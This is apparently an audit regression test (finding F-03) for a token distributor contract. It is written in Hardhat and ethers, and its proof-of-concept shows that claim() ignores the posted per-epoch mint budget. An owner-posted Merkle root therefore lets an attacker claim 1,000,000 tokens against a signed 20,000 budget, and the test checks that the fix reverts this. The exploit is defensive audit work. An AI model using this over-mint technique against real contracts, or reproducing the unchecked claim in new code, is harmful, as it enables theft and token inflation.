// F-03 — Emission budget is decorative: claim() never checks the epoch's posted totalMint.
// postEpoch() verifies budget (anchor × rate, capped by epochCap) and stores totalMint, but
// claim() only checks the Merkle proof and the global CAP. Whoever posts the Merkle root
// (the owner key) can therefore allocate ANY amount to any address, far above the signed
// budget. Owner key ⇒ unbounded mint up to CAP = 1,000,000,000 DIAMOND.
const { expect } = require("../lib/expect");
const { ethers } = require("hardhat");
const W_ = require("../lib/world");
const { makeWorld, E18, U, SET, isFixed, hd, revertOf, now, timeTravel } = W_;

// two-leaf OZ-style merkle tree in the exact format of DiamondDistributor._verify
const leafOf = (epochId, account, amount) => ethers.keccak256(ethers.concat([
  ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["uint256", "address", "uint256"], [epochId, account, amount]))]));
const pairHash = (a, b) => (a < b ? ethers.keccak256(ethers.concat([a, b])) : ethers.keccak256(ethers.concat([b, a])));

describe(`F-03 distributor claims unbounded by budget [set=${SET}]`, function () {
  this.timeout(600000);

  it("owner posts totalMint=20,000 DIAMOND (within budget) but the root pays attacker 1,000,000", async () => {
    const W = await makeWorld({ withOptions: false });
    const { owner, p3: attacker, p4: honest } = W.signers;
    const dist = W.dist, dA = await dist.getAddress();
    await (await W.diamond.setMinter(dA)).wait();
    await (await dist.setBudgetAttester(W.keys.budgeter.address)).wait();

    const epochId = 1;
    const anchorUsd = U(100);           // $100 realized fee+edge
    const price = 1_000_000n;           // $0.01 per DIAMOND (×1e8)
    const honestAmt = E18(10_000), attackerAmt = E18(1_000_000);
    const leafA = leafOf(epochId, attacker.address, attackerAmt);
    const leafH = leafOf(epochId, honest.address, honestAmt);
    const root = pairHash(leafA, leafH);
    // fixed set (D2): the budget hash is bound to chainid + distributor; the contract exposes it
    const sigDigest = isFixed()
      ? await dist.budgetHash(epochId, anchorUsd, price)
      : ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["uint256", "uint256", "uint256"], [epochId, anchorUsd, price]));
    const budgetSig = await W.keys.budgeter.signMessage(ethers.getBytes(sigDigest));
    const budget = await dist.budgetFor(anchorUsd, price);
    console.log(`  [EVIDENCE] signed anchor=$100, price=$0.01 → on-chain budget = ${ethers.formatUnits(budget, 18)} DIAMOND`);

    // honest-looking header: totalMint = the budget (passes "over budget" check)
    await (await dist.postEpoch(epochId, root, budget, anchorUsd, price, budgetSig)).wait();
    console.log(`  [EVIDENCE] postEpoch(totalMint=${ethers.formatUnits(budget, 18)} DIAMOND) accepted`);

    const rc = await revertOf(dist.connect(attacker).claim(epochId, attackerAmt, [leafH]));
    const bal = await W.diamond.balanceOf(attacker.address);
    console.log(`  [EVIDENCE] attacker claim(1,000,000 DIAMOND) → ${rc ?? "OK"}; attacker balance = ${ethers.formatUnits(bal, 18)} DIAMOND`);
    console.log(`  [EVIDENCE] dist.totalMinted = ${ethers.formatUnits(await dist.totalMinted(), 18)} DIAMOND vs epoch budget ${ethers.formatUnits(budget, 18)}`);

    if (!isFixed()) {
      expect(rc).to.equal(null);
      expect(bal).to.equal(attackerAmt);
    } else {
      expect(rc).to.equal("epoch budget exhausted");   // F-03: per-epoch claimed ≤ posted totalMint
      expect(bal).to.equal(0n);
    }
  });
});
